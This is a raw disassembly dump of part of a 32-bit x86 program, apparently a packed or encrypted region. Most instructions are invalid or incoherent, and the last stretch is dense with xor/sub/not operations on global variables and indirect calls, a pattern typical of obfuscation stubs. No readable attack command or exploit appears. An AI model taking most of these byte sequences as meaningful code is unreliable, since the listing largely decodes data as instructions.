  403565:	les    ecx,FWORD PTR [edx+0x350012d]
  40356b:	mov    bl,0x45
  40356d:	pop    ebx
  40356e:	imul   esp,ebx,0xffffff96
  403571:	adc    eax,0xcd628820
  403576:	and    DWORD PTR [ecx],edx
  403578:	mov    esp,0xb875eaea
  40357d:	neg    esp
  40357f:	ins    BYTE PTR es:[edi],dx
  403580:	pop    edx
  403581:	sub    ebp,esp
  403583:	and    ecx,DWORD PTR [ebx]
  403585:	in     al,dx
  403586:	(bad)  
  403587:	shl    BYTE PTR [ebp+0xd],0x1c
  40358b:	dec    eax
  40358c:	popf   
  40358d:	add    eax,0xde1811dd
  403592:	stos   BYTE PTR es:[edi],al
  403593:	push   0xffffff8c
  403595:	dec    edx
  403596:	and    esi,DWORD PTR [esi+edx*4-0x74]
  40359a:	test   DWORD PTR [eax-0x49],eax
  40359d:	xor    eax,0xa1ec766f
  4035a2:	stos   BYTE PTR es:[edi],al
  4035a3:	ret    
  4035a4:	xor    BYTE PTR [ecx+edi*1+0x74],dh
  4035a8:	call   0xa15fc02d
  4035ad:	ins    BYTE PTR es:[edi],dx
  4035ae:	daa    
  4035af:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4035b1:	daa    
  4035b2:	mov    esp,0x5047a416
  4035b7:	push   ss
  4035b8:	stc    
  4035b9:	test   DWORD PTR [eax-0x72],edx
  4035bc:	adc    BYTE PTR ds:0xfa119203,0x55
  4035c3:	out    0x1b,eax
  4035c5:	xchg   DWORD PTR [ebx-0x2d05d37],ebx
  4035cb:	xor    eax,0xff12f611
  4035d0:	adc    BYTE PTR [ebx],cl
  4035d2:	pop    ebx
  4035d3:	push   edx
  4035d4:	sbb    DWORD PTR [bx+di-0x24],edi
  4035d8:	sub    ebp,ecx
  4035da:	(bad)  
  4035de:	jbe    0x403645
  4035e0:	(bad)  
  4035e1:	cmp    cl,BYTE PTR [ecx+0x6c3632ce]
  4035e7:	cmp    bh,bh
  4035e9:	sbb    DWORD PTR [esi+0x2d6aaffc],ebp
  4035ef:	lahf   
  4035f0:	(bad)  
  4035f1:	jp     0x4035af
  4035f3:	ja     0x4035c8
  4035f5:	aam    0xd5
  4035f7:	xlat   BYTE PTR ds:[ebx]
  4035f8:	mov    dh,0x8c
  4035fa:	imul   esi,DWORD PTR [eax-0x6053d60f],0xffffffcd
  403601:	sub    cl,BYTE PTR [ecx+0xf16f024]
  403607:	loope  0x403682
  403609:	mov    ah,0xf0
  40360b:	std    
  40360c:	xor    dh,BYTE PTR ds:0xee3c86e7
  403612:	ror    ah,cl
  403614:	fild   WORD PTR [ebx+0x1b]
  403617:	xor    DWORD PTR [ebp-0x65],ebx
  40361a:	mov    edi,0xa2710054
  40361f:	call   0xc5f9:0xc0adc166
  403626:	test   eax,0x5c53c315
  40362b:	mov    al,ds:0x84e7cc16
  403630:	xchg   BYTE PTR [edx+0x7c],al
  403633:	lock imul ebx,edi,0x5e5e66ad
  40363a:	jl     0x403640
  40363c:	je     0x4035d8
  40363e:	add    eax,DWORD PTR [edx-0x4ee183d1]
  403644:	xchg   edi,eax
  403645:	push   0xfffffffc
  403647:	mov    bh,0xf0
  403649:	sub    BYTE PTR [ebx],ah
  40364b:	lea    ecx,[ecx-0x56560868]
  403651:	pop    ebp
  403652:	int3   
  403653:	in     eax,dx
  403654:	pop    es
  403655:	loop   0x403619
  403657:	lds    ecx,FWORD PTR [ecx]
  403659:	in     al,0x8e
  40365b:	inc    esp
  40365c:	mov    BYTE PTR [edx],dl
  40365e:	(bad)  
  40365f:	lods   al,BYTE PTR ds:[esi]
  403660:	outs   dx,BYTE PTR ds:[esi]
  403661:	adc    bl,BYTE PTR [edi]
  403663:	push   es
  403664:	adc    eax,DWORD PTR [edi+0x3b8612ab]
  40366a:	cs stc 
  40366c:	lahf   
  40366d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40366e:	add    BYTE PTR [esi-0x31],0x67
  403672:	and    edx,DWORD PTR ds:0xa71450a8
  403678:	and    al,0x1e
  40367a:	push   ds
  40367b:	sub    DWORD PTR [edx],0xffffff86
  40367e:	and    DWORD PTR [edi+edi*1],0x3
  403682:	lds    ecx,FWORD PTR [edi+0x6b]
  403685:	sub    DWORD PTR [eax+0x6f],edx
  403688:	mov    BYTE PTR [eax],ah
  40368a:	call   0xfe2d:0x8342d030
  403691:	sbb    eax,esp
  403693:	adc    BYTE PTR [ebx],dh
  403695:	jmp    0x7485:0x3d989d3c
  40369c:	sbb    BYTE PTR [ebp-0x3adffd],ah
  4036a2:	inc    ecx
  4036a3:	sbb    al,al
  4036a5:	sub    eax,0x79817cf0
  4036aa:	gs jnp 0x4036aa
  4036ad:	aaa    
  4036ae:	mov    ch,0x8
  4036b1:	mov    ah,0x2b
  4036b3:	das    
  4036b4:	fimul  DWORD PTR [edi+0x41]
  4036b7:	sti    
  4036b8:	clc    
  4036b9:	fucomi st,st(2)
  4036bb:	mov    BYTE PTR ss:[ebp-0x26],al
  4036bf:	jp     0x4036be
  4036c1:	test   eax,0xead2219f
  4036c6:	mov    ss,edx
  4036c8:	push   ebp
  4036c9:	cmc    
  4036ca:	popa   
  4036cb:	jmp    FWORD PTR [ebx-0x43]
  4036ce:	stc    
  4036cf:	popa   
  4036d0:	pushf  
  4036d1:	gs jmp 0x7382:0x720cae4e
  4036d9:	pop    eax
  4036da:	mov    esp,0x522f509c
  4036df:	sbb    edi,esi
  4036e1:	enter  0xa2c9,0x83
  4036e5:	retf   
  4036e6:	test   eax,0x3e28ca2a
  4036eb:	pop    ecx
  4036ec:	mov    ds:0xd557fdeb,eax
  4036f1:	sub    al,0xf0
  4036f3:	enter  0xe6ee,0x51
  4036f7:	outs   dx,DWORD PTR ds:[esi]
  4036f8:	popf   
  4036f9:	and    eax,0x7e17179a
  4036fe:	pop    ecx
  4036ff:	fadd   QWORD PTR [eax]
  403701:	xchg   edx,eax
  403702:	push   ebx
  403703:	fistp  DWORD PTR [edx]
  403705:	and    eax,0x7f106e9c
  40370a:	out    dx,al
  40370b:	fdivr  QWORD PTR [edx+0xc930b17]
  403711:	and    al,0x28
  403713:	inc    ebx
  403714:	test   DWORD PTR ds:0xea9e3cab,0xa315d6cb
  40371e:	in     eax,0x3b
  403720:	pop    ds
  403721:	ret    
  403722:	sbb    eax,0xe1583e05
  403727:	jb     0x4036f0
  403729:	jmp    0xe6e0:0xec3ad479
  403730:	les    edx,FWORD PTR [ecx+0x6b]
  403733:	rcl    BYTE PTR [ecx+edi*2-0x46],cl
  403737:	push   edi
  403738:	pop    ebp
  403739:	xor    DWORD PTR [esi+0x64],edx
  40373c:	or     esp,eax
  40373e:	fist   WORD PTR [edx+0x3fc6fcb4]
  403744:	cdq    
  403745:	mov    esi,0xd13ce54f
  40374a:	adc    BYTE PTR [ebp-0x27],al
  40374d:	push   ebx
  40374e:	int    0xbc
  403750:	lods   eax,DWORD PTR ds:[esi]
  403751:	je     0x403783
  403753:	(bad)  
  403754:	xchg   edx,eax
  403755:	jns    0x4037cc
  403757:	scas   eax,DWORD PTR es:[edi]
  403758:	add    bl,bh
  40375a:	popa   
  40375b:	fs sbb ecx,edx
  40375e:	xchg   esp,eax
  40375f:	arpl   WORD PTR [edx-0x3],si
  403762:	mov    ebp,0xf418fd6
  403767:	add    dh,BYTE PTR [esi-0x4487fa55]
  40376d:	fld    TBYTE PTR [edi+0xb]
  403770:	push   ecx
  403771:	xor    edi,DWORD PTR [edx+0x41]
  403774:	sub    bl,BYTE PTR [ecx]
  403776:	mov    bl,0x28
  403778:	sub    al,0xdd
  40377a:	imul   edx,ebx,0x4
  40377d:	inc    edx
  40377e:	int3   
  40377f:	fsubr  st(3),st
  403781:	pop    ds
  403782:	(bad)  
  403783:	jmp    0x814bfe49
  403788:	sbb    esp,edi
  40378a:	add    dl,BYTE PTR ds:[ebp+ebx*4-0x49]
  40378f:	inc    esi
  403790:	dec    edx
  403791:	int    0x5e
  403793:	lock adc bl,BYTE PTR [ecx+0x306ca079]
  40379a:	or     al,BYTE PTR ds:0xd221596a
  4037a0:	and    BYTE PTR [eax+eiz*8-0x418ce941],dh
  4037a7:	inc    edx
  4037a8:	cmp    al,0x65
  4037aa:	mov    eax,0xf154ceee
  4037af:	inc    edi
  4037b0:	and    BYTE PTR [ebp+0x42],ah
  4037b3:	inc    eax
  4037b4:	xchg   ebp,eax
  4037b5:	aad    0x7
  4037b7:	sbb    al,0xaa
  4037b9:	sub    edx,edx
  4037bb:	push   eax
  4037bc:	sti    
  4037bd:	test   eax,0x85311ab0
  4037c2:	fdiv   QWORD PTR [esi-0x1fc3ddd1]
  4037c8:	(bad)  
  4037c9:	ror    DWORD PTR [eax],1
  4037cb:	daa    
  4037cc:	cs jns 0x4037a7
  4037cf:	lahf   
  4037d0:	jmp    0x403794
  4037d2:	add    al,0x34
  4037d4:	jmp    0x403803
  4037d6:	xchg   esi,eax
  4037d7:	sub    BYTE PTR [edx],ch
  4037d9:	lds    esp,FWORD PTR ds:0xebf8afd5
  4037df:	sub    ch,0x2d
  4037e2:	nop
  4037e3:	mov    ecx,0x3deeb060
  4037e8:	and    al,0x8c
  4037ea:	ret    0xe80c
  4037ed:	add    ch,BYTE PTR [esp+edx*2-0x5a72f8e7]
  4037f4:	aam    0x52
  4037f6:	xchg   ebx,eax
  4037f7:	icebp  
  4037f8:	mov    al,ds:0x878de41b
  4037fd:	xchg   ecx,eax
  4037fe:	stos   BYTE PTR es:[edi],al
  4037ff:	adc    DWORD PTR [ebp+0x2305e5a],esi
  403805:	push   es
  403806:	cmp    bl,BYTE PTR [ebp+0x2f]
  403809:	push   esp
  40380a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40380b:	imul   esi,DWORD PTR [edx+0x1a],0x4a
  40380f:	push   edi
  403810:	xchg   esi,eax
  403811:	pop    eax
  403812:	nop
  403813:	fldlg2 
  403815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403816:	repz rcr al,0xa0
  40381a:	mov    ebx,0x55d697bf
  40381f:	sbb    bh,bl
  403821:	stos   BYTE PTR es:[edi],al
  403822:	aaa    
  403823:	mov    ch,0x58
  403825:	pop    ebp
  403826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403827:	aaa    
  403828:	jle    0x40384c
  40382a:	mov    ebp,0xae0204ef
  40382f:	ror    BYTE PTR ds:0xd8bb1379,0x7d
  403836:	aas    
  403837:	add    eax,0x72888dee
  40383c:	jnp    0x403837
  40383e:	imul   edx,DWORD PTR [ecx-0x50],0x856ecdbc
  403845:	in     al,dx
  403846:	mov    esp,0x955b790e
  40384b:	mov    edx,0x1bdda3ef
  403850:	cld    
  403851:	inc    esp
  403852:	shl    DWORD PTR [edi],cl
  403854:	pop    edi
  403855:	pop    edx
  403856:	sub    edi,DWORD PTR [eax]
  403858:	shl    ch,0x5
  40385b:	data16 and al,0xa8
  40385e:	out    dx,eax
  40385f:	stos   DWORD PTR es:[edi],eax
  403860:	jle    0x403867
  403862:	loopne 0x4038b6
  403864:	mov    esi,0x82963136
  403869:	or     eax,0x317cebc3
  40386e:	(bad)  
  40386f:	mov    ebx,DWORD PTR [ebp+edi*2+0x68cf527e]
  403876:	out    0x33,al
  403878:	in     al,dx
  403879:	retf   0xeaf6
  40387c:	out    dx,eax
  40387d:	outs   dx,BYTE PTR ds:[esi]
  40387e:	in     eax,dx
  40387f:	mov    edx,0x5ef7f013
  403884:	pushf  
  403885:	popf   
  403886:	cmp    BYTE PTR [edx-0x211a6058],bl
  40388c:	mov    ecx,0xdb4548f1
  403891:	mov    BYTE PTR [ebp+0x105e1715],ch
  403897:	in     eax,dx
  403898:	aaa    
  403899:	imul   ebp,DWORD PTR [ebp+0x73],0x3ea57820
  4038a0:	cmp    al,0x92
  4038a2:	sbb    BYTE PTR [edi-0x33],dl
  4038a5:	enter  0x6daa,0xf9
  4038a9:	xor    ecx,esp
  4038ab:	pop    esp
  4038ac:	xor    BYTE PTR [edi+0x7ef3b40e],bl
  4038b2:	jp     0x4038bb
  4038b4:	cmp    BYTE PTR [eax+0xe],dh
  4038b7:	and    eax,0x5aeb5aa2
  4038bc:	sar    DWORD PTR ds:0x94e59763,0xff
  4038c3:	psrad  mm4,QWORD PTR [esi-0x183bfda5]
  4038ca:	popa   
  4038cb:	call   0x9268:0x109ef645
  4038d2:	(bad)  
  4038d3:	(bad)  
  4038d4:	xlat   BYTE PTR ds:[ebx]
  4038d5:	inc    eax
  4038d6:	in     eax,dx
  4038d7:	test   eax,0xfcd61e2b
  4038dc:	jne    0x403889
  4038de:	mov    eax,DWORD PTR [edi+ebp*1]
  4038e1:	jl     0x4038ba
  4038e3:	aam    0xd7
  4038e5:	shrd   ecx,edx,0x2
  4038e9:	xor    DWORD PTR ds:0x4284e5,0x428595
  4038f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4038f6:	mov    ecx,DWORD PTR [ebp+0x18]
  4038f9:	xor    DWORD PTR ds:0x428479,0x4285a1
  403903:	xor    DWORD PTR [ebp-0x1c],edi
  403906:	adc    DWORD PTR ds:0x428465,0x4aad
  403910:	shl    ecx,0x1e
  403913:	not    DWORD PTR ds:0x42842d
  403919:	xor    ecx,ecx
  40391b:	sub    DWORD PTR ds:0x428579,0x450d
  403925:	or     ecx,DWORD PTR [ebp-0x1c]
  403928:	jmp    0x403cc9
  40392d:	cdq    
  40392e:	jbe    0x40398b
  403930:	fidivr WORD PTR [ebx+eiz*8-0x40084545]
  403937:	mul    BYTE PTR [esi+edi*8-0x426db5b2]
  40393e:	in     eax,dx
  40393f:	mov    esi,0xbec4bdbe
  403944:	mov    esi,0xdaf73817
  403949:	rol    DWORD PTR [ebx+0x4f],1
  40394c:	cmp    eax,0x3e6c7e9c
  403951:	mov    BYTE PTR [ecx+0x4d],0x9a
  403955:	lods   eax,DWORD PTR ds:[esi]
  403956:	or     dl,BYTE PTR [ebp+0x51]
  403959:	or     BYTE PTR [eax+0x74],bh
  40395c:	lahf   
  40395d:	mov    ebx,0xaffcada0
  403962:	lods   eax,DWORD PTR ds:[esi]
  403963:	xchg   bl,ah
  403965:	dec    ebp
  403966:	pop    esi
  403967:	mov    ecx,DWORD PTR [ebp-0x73]
  40396a:	cmp    al,0xf9
  40396c:	pop    ebp
  40396d:	mov    ds:0xcbdeaea1,eax
  403972:	pop    esp
  403973:	mov    bh,0xe2
  403975:	scas   al,BYTE PTR es:[edi]
  403976:	ins    BYTE PTR es:[edi],dx
  403977:	cmp    DWORD PTR [edx+ecx*2-0x63b3994c],esi
  40397e:	mov    ebp,0x10ae9a35
  403983:	loopne 0x403920
  403985:	loop   0x4039e1
  403987:	lods   eax,DWORD PTR ds:[esi]
  403988:	and    ah,0x95
  40398b:	out    dx,eax
  40398c:	jmp    0xa56a:0x16c3c20f
  403993:	leave  
  403994:	xor    DWORD PTR [ebx+edi*1],esp
  403997:	out    0x3d,eax
  403999:	stc    
  40399a:	in     al,dx
  40399b:	mov    ds:0xbb2dca7d,al
  4039a0:	or     ebx,ebx
  4039a2:	mov    DWORD PTR ds:0xe20b4e08,edi
  4039a8:	fild   QWORD PTR [ebx+0x37768374]
  4039ae:	and    al,0xe9
  4039b0:	jne    0x40394a
  4039b2:	outs   dx,BYTE PTR ds:[esi]
  4039b3:	jae    0x4039f1
  4039b5:	leave  
  4039b6:	cs jno 0x4039a6
  4039b9:	cmp    bh,BYTE PTR [eax-0x66]
  4039bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039bd:	pop    ecx
  4039be:	test   cl,cl
  4039c0:	dec    BYTE PTR [eax-0x59971598]
  4039c6:	frstor [edi-0x23c518c7]
  4039cc:	cmp    BYTE PTR ds:[esp+eax*4+0x54ee9edd],cl
  4039d4:	jno    0x4039fc
  4039d6:	jbe    0x403961
  4039d8:	add    ebx,ecx
  4039da:	nop
  4039db:	or     DWORD PTR [esi+0x3c2f7d6b],0x74a36e1b
  4039e5:	sbb    al,BYTE PTR [edi-0x9ea5bba]
  4039eb:	or     DWORD PTR ds:0xc57be4c9,0x2f09f0dd
  4039f5:	or     al,0xa8
  4039f7:	rcl    DWORD PTR [edi+0x350878a8],1
  4039fd:	jne    0x403a45
  4039ff:	daa    
  403a00:	push   ss
  403a01:	add    al,0xa6
  403a03:	mov    cl,0x54
  403a05:	fld    TBYTE PTR [ecx+0x7a]
  403a08:	xchg   edx,eax
  403a09:	imul   esi,edx,0xf629e4d2
  403a0f:	rcl    BYTE PTR [eax+0x7d990e59],cl
  403a15:	not    BYTE PTR [edi]
  403a17:	dec    esi
  403a18:	xchg   ebp,eax
  403a19:	mov    ecx,0x266feb68
  403a1e:	test   al,0xae
  403a20:	hlt    
  403a21:	aas    
  403a22:	icebp  
  403a23:	sbb    al,0x47
  403a25:	ret    0xee38
  403a28:	push   esi
  403a29:	cwde   
  403a2a:	cli    
  403a2b:	or     BYTE PTR [edx-0x4f],0xaa
  403a2f:	mov    ds:0x417b29,eax
  403a34:	jbe    0x403a74
  403a36:	or     bh,BYTE PTR [eax]
  403a38:	ficomp WORD PTR [edi+0x5cb8bb17]
  403a3e:	and    eax,0xa0e1af2c
  403a43:	mov    ecx,0xcb7a1a92
  403a48:	ja     0x403a3f
  403a4a:	or     DWORD PTR [edx],esi
  403a4c:	push   ebx
  403a4d:	lahf   
  403a4e:	idiv   BYTE PTR [ecx]
  403a50:	aad    0xcb
  403a52:	dec    ecx
  403a53:	je     0x403a9b
  403a55:	add    DWORD PTR [ecx+0x313c0d06],edi
  403a5b:	pop    edi
  403a5c:	ins    BYTE PTR es:[edi],dx
  403a5d:	inc    ebx
  403a5e:	push   ds
  403a5f:	(bad)  [ecx-0x2c]
  403a62:	mov    esi,0x39e8ee
  403a67:	jbe    0x403ad1
  403a69:	retf   0x41c2
  403a6c:	cmp    DWORD PTR [esi-0x51],edi
  403a6f:	mov    eax,ds:0xa55f7c33
  403a74:	ds (bad) 
  403a77:	int    0x6e
  403a79:	mov    bh,0x9d
  403a7b:	test   DWORD PTR [ecx],ebx
  403a7d:	pop    ebp
  403a7e:	pusha  
  403a7f:	xor    eax,0x16a720b1
  403a84:	jbe    0x403a44
  403a86:	or     ah,BYTE PTR [eax]
  403a88:	adc    DWORD PTR [edx],esp
  403a8a:	sub    eax,0x622ed984
  403a8f:	sbb    al,BYTE PTR [eax+0x55850087]
  403a95:	leave  
  403a96:	int    0x8e
  403a98:	jge    0x403a20
  403a9a:	cwde   
  403a9b:	outs   dx,BYTE PTR ds:[esi]
  403a9c:	imul   ebp,DWORD PTR [ebp+0x41e76ba2],0xff5c3273
  403aa6:	xor    al,0x59
  403aa8:	popf   
  403aa9:	int3   
  403aaa:	jnp    0x403aca
  403aac:	ror    BYTE PTR ds:0x509a16ca,0xad
  403ab3:	scas   eax,DWORD PTR es:[edi]
  403ab4:	into   
  403ab5:	ror    BYTE PTR [ebp+0x49],0x3f
  403ab9:	into   
  403aba:	pop    ss
  403abb:	enter  0xc53a,0xed
  403abf:	sbb    BYTE PTR [ebx-0x4e],al
  403ac2:	js     0x403aa7
  403ac4:	ins    BYTE PTR es:[edi],dx
  403ac5:	imul   ebp,DWORD PTR [esi],0xa3c38f07
  403acb:	pushf  
  403acc:	and    BYTE PTR [ebp+0x1d],ah
  403acf:	push   esi
  403ad0:	cli    
  403ad1:	jle    0x403a76
  403ad3:	icebp  
  403ad4:	inc    eax
  403ad5:	sub    eax,0x976f102
  403ada:	icebp  
  403adb:	ret    
  403adc:	xor    al,0x8f
  403ade:	in     eax,dx
  403adf:	test   eax,0x2b05ea2c
  403ae4:	xor    DWORD PTR [edi-0x9fedd66],edx
  403aea:	retf   
  403aeb:	ds cs cld 
  403aee:	outs   dx,DWORD PTR ds:[esi]
  403aef:	lock lahf 
  403af1:	loope  0x403aaf
  403af3:	or     al,0xaf
  403af5:	jno    0x403af4
  403af7:	retf   0xe262
  403afa:	jb     0x403afc
  403afc:	sahf   
  403afd:	mov    al,BYTE PTR [eax+0x682d72d8]
  403b03:	pop    esi
  403b04:	daa    
  403b05:	out    dx,al
  403b06:	push   es
  403b07:	ja     0x403b65
  403b09:	jne    0x403b08
  403b0b:	cmp    al,0x39
  403b0d:	mov    eax,ds:0xb5129e6
  403b12:	and    eax,0x4629d2e1
  403b17:	ins    DWORD PTR es:[edi],dx
  403b18:	(bad)  
  403b19:	mov    ecx,0x16c5db77
  403b1e:	mov    BYTE PTR [edi],dh
  403b20:	dec    esp
  403b21:	xchg   ecx,eax
  403b22:	xchg   edi,eax
  403b23:	and    esp,DWORD PTR [edi+0x11]
  403b26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b27:	fisttp DWORD PTR [edx+ebx*1]
  403b2a:	std    
  403b2b:	aad    0x40
  403b2d:	dec    ecx
  403b2e:	lock aas 
  403b30:	fstp   DWORD PTR [ebx]
  403b32:	call   0xe1f1:0xe953f87
  403b39:	lea    eax,[ebp+ebp*1+0x7d08e56c]
  403b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b41:	cmp    dl,bl
  403b43:	pusha  
  403b44:	cmp    eax,0xf7179f06
  403b49:	mov    bl,0x4
  403b4b:	mov    bh,0xe2
  403b4d:	ins    DWORD PTR es:[edi],dx
  403b4e:	popa   
  403b4f:	pusha  
  403b50:	mov    ecx,0x1f5ff0cf
  403b55:	inc    edx
  403b56:	mov    ebp,DWORD PTR [ecx-0x38]
  403b59:	(bad)  
  403b5a:	and    bl,BYTE PTR [edx-0x3ea503]
  403b60:	xchg   BYTE PTR [eax],dl
  403b62:	stos   DWORD PTR es:[edi],eax
  403b63:	cmp    dl,BYTE PTR [esi-0x19]
  403b66:	ja     0x403b7d
  403b68:	bound  esp,QWORD PTR [ecx]
  403b6a:	mov    ah,0xda
  403b6c:	imul   ebx,DWORD PTR [ebx],0xffffffee
  403b6f:	jl     0x403bbd
  403b71:	xor    cl,dl
  403b73:	mov    dh,0x76
  403b75:	adc    eax,0xd0ff3e00
  403b7a:	cmp    ch,al
  403b7c:	dec    eax
  403b7d:	and    esp,eax
  403b7f:	sub    al,0x95
  403b81:	adc    cl,BYTE PTR [ebx]
  403b83:	mov    eax,ds:0x7c7f158f
  403b88:	jb     0x403b3e
  403b8a:	dec    ebx
  403b8b:	stc    
  403b8c:	adc    DWORD PTR [eax+0x61],0x12a3fa0b
  403b93:	ret    0xb727
  403b96:	pop    edi
  403b97:	fdivr  DWORD PTR [eax-0x2bcbe696]
  403b9d:	ret    
  403b9e:	test   ch,dh
  403ba0:	jmp    0x5b0f:0x6f2263b4
  403ba7:	mov    al,0xeb
  403ba9:	sub    edi,DWORD PTR [edx-0x63]
  403bac:	and    bl,BYTE PTR [edx]
  403bae:	mov    cl,BYTE PTR [eax-0x5d8a959d]
  403bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb5:	jmp    0xb1bea82b
  403bba:	daa    
  403bbb:	cwde   
  403bbc:	add    eax,0x290e03f6
  403bc1:	sbb    al,0xa7
  403bc3:	(bad)  
  403bc4:	mov    dh,BYTE PTR [ecx+0x1a248696]
  403bca:	pop    ebp
  403bcb:	pop    eax
  403bcc:	cmp    cl,ah
  403bce:	test   al,0x73
  403bd0:	sbb    BYTE PTR [edi],cl
  403bd2:	rol    DWORD PTR [ebp-0x3e],1
  403bd5:	xlat   BYTE PTR ds:[ebx]
  403bd6:	add    BYTE PTR [ecx+0x7b],bl
  403bd9:	scas   eax,DWORD PTR es:[edi]
  403bda:	cs push 0x1
  403bdd:	fdivr  DWORD PTR [eax+ecx*8-0x42446fa5]
  403be4:	dec    esi
  403be5:	lods   eax,DWORD PTR ds:[esi]
  403be6:	out    0x4e,al
  403be8:	shl    BYTE PTR [ecx-0x50],cl
  403beb:	mov    DWORD PTR [edx],edx
  403bed:	pusha  
  403bee:	sub    DWORD PTR [esi+0x330fbb],eax
  403bf4:	pop    edi
  403bf5:	pop    esi
  403bf6:	mov    esi,0xff385bc1
  403bfb:	xchg   BYTE PTR fs:[ecx+0x1132e7e5],bh
  403c02:	in     al,0x91
  403c04:	and    DWORD PTR [esi],esp
  403c06:	inc    edx
  403c07:	mov    eax,ds:0x3ca19c89
  403c0c:	inc    edi
  403c0d:	outs   dx,BYTE PTR ds:[esi]
  403c0e:	pop    esi
  403c0f:	test   DWORD PTR [edx],ebp
  403c11:	add    DWORD PTR [edx],0x389d66f2
  403c17:	sub    dl,BYTE PTR [edx+eax*2-0x1d31f07d]
  403c1e:	ror    DWORD PTR [ebx],cl
  403c20:	lods   eax,DWORD PTR ds:[esi]
  403c21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c22:	imul   ecx,DWORD PTR [ebx],0x7bb034fd
  403c28:	mov    eax,ds:0x21c20eda
  403c2d:	call   0x3c47:0x3535ee9e
  403c34:	and    ah,bl
  403c36:	jbe    0x403bd0
  403c38:	mov    ?,WORD PTR [edi]
  403c3a:	pop    ebx
  403c3b:	inc    edx
  403c3c:	adc    ah,bl
  403c3e:	and    DWORD PTR [edx-0x8],edi
  403c41:	ror    ebp,1
  403c43:	jg     0x403ca7
  403c45:	push   ss
  403c46:	jp     0x403ca2
  403c48:	and    al,0xf4
  403c4a:	scas   al,BYTE PTR es:[edi]
  403c4b:	and    ebx,ecx
  403c4d:	bound  edi,QWORD PTR [ebp-0x29]
  403c50:	out    dx,al
  403c51:	(bad)  
  403c52:	stos   BYTE PTR es:[edi],al
  403c53:	and    ecx,DWORD PTR [ecx+esi*8-0xd]
  403c57:	mov    esi,0xfee63be5
  403c5c:	addr16 mov ah,0xaf
  403c5f:	std    
  403c60:	ins    BYTE PTR es:[edi],dx
  403c61:	pop    ebx
  403c62:	cwde   
  403c63:	jl     0x403ca5
  403c65:	fist   DWORD PTR [ecx]
  403c67:	out    0x6b,eax
  403c69:	add    esi,0xcbf326d2
  403c6f:	cmp    al,BYTE PTR [ebx-0x7bf11bf0]
  403c75:	daa    
  403c76:	adc    BYTE PTR [esi],dl
  403c78:	iret   
  403c79:	sbb    esp,DWORD PTR [ecx+esi*2]
  403c7c:	xchg   DWORD PTR [ecx],esp
  403c7e:	jecxz  0x403c88
  403c80:	push   esi
  403c81:	repz cs repnz dec ebx
  403c85:	dec    edx
  403c86:	sub    DWORD PTR [edx+0x1b],ebx
  403c89:	add    al,0x20
  403c8b:	in     eax,0xad
  403c8d:	and    al,0x7e
  403c8f:	push   ecx
  403c90:	add    DWORD PTR [ebx+0x58],edi
  403c93:	shr    DWORD PTR [ecx],cl
  403c95:	hlt    
  403c96:	or     al,0x1e
  403c98:	mov    esp,0x7536bed5
  403c9d:	arpl   sp,bx
  403c9f:	mov    al,ds:0x52ca4a06
  403ca4:	inc    ebp
  403ca5:	cmc    
  403ca6:	les    edi,FWORD PTR [ecx-0x42]
  403ca9:	mov    esp,0x26b2026f
  403cae:	or     esi,DWORD PTR [edx-0x26753b96]
  403cb4:	imul   edi,DWORD PTR [ebx-0x37facc11],0x61df3159
  403cbe:	jo     0x403d17
  403cc0:	sub    eax,0x1b67b47c
  403cc5:	adc    DWORD PTR [edi-0x153e7d7f],ebp
  403ccb:	add    cl,BYTE PTR [edi]
  403ccd:	mov    bh,0x15
  403ccf:	xor    DWORD PTR [edx+eax*2+0x2d152100],eax
  403cd6:	test   BYTE PTR [edx+0x0],al
  403cd9:	mov    edx,DWORD PTR [ebp+0x1c]
  403cdc:	cmp    DWORD PTR ds:0x428495,0x0
  403ce3:	mov    edx,0xb30
  403ce8:	not    DWORD PTR ds:0x42835d
  403cee:	jmp    0x403db9
  403cf3:	mov    DWORD PTR ds:0x428361,0x7955
  403cfd:	mov    DWORD PTR ds:0x4284ed,0x3fbe
  403d07:	cmp    DWORD PTR ds:0x428495,0x0
  403d0e:	jae    0x403d49
  403d14:	push   0x2165
  403d19:	push   0x209b
  403d1e:	push   0x61ab
  403d23:	push   0x585a
  403d28:	push   DWORD PTR [ebp-0x14]
  403d2b:	call   DWORD PTR ds:0x42e0c0
  403d31:	xor    DWORD PTR ds:0x42842d,edi
  403d37:	xor    DWORD PTR ds:0x428439,edi
  403d3d:	xor    edx,DWORD PTR ds:0x428499
  403d43:	sub    DWORD PTR ds:0x428385,edi
  403d49:	sbb    DWORD PTR ds:0x4284a1,0x3090
  403d53:	sub    DWORD PTR ds:0x428451,ecx
  403d59:	xor    DWORD PTR ds:0x4284fd,edi
  403d5f:	cmp    DWORD PTR ds:0x42856d,0x0
  403d66:	mov    edx,0x71bd
  403d6b:	not    edx
  403d6d:	jmp    0x403db9
  403d72:	mov    edx,0x37a5
  403d77:	mov    edx,0x5337
  403d7c:	cmp    DWORD PTR ds:0x42856d,0x0
  403d83:	jle    0x403dad
  403d89:	push   0x428465
  403d8e:	call   DWORD PTR ds:0x42e0c4
  403d94:	mov    edx,DWORD PTR ds:0x428541
  403d9a:	mov    edx,DWORD PTR [edx]
  403d9c:	and    DWORD PTR ds:0x42834d,edx
  403da2:	adc    DWORD PTR ds:0x428449,0x11e9
  403dac:	dec    edx
  403dad:	and    edx,0xf08
  403db3:	sub    edx,DWORD PTR ds:0x428591
  403db9:	mov    DWORD PTR [ebp-0x2c],ecx
  403dbc:	mov    ecx,DWORD PTR [esi]
  403dbe:	add    DWORD PTR ds:0x428465,ebx
  403dc4:	mov    edx,DWORD PTR [esi+0x4]
  403dc7:	or     DWORD PTR ds:0x428355,0x428369
  403dd1:	shrd   ecx,edx,0x2
  403dd5:	xor    DWORD PTR ds:0x4284f9,0x24cb
  403ddf:	shr    edx,0x2
  403de2:	and    edx,DWORD PTR ds:0x428581
  403de8:	mov    DWORD PTR [ebp-0x1c],ecx
  403deb:	mov    ecx,DWORD PTR [esi]
  403ded:	mov    edx,DWORD PTR [esi+0x4]
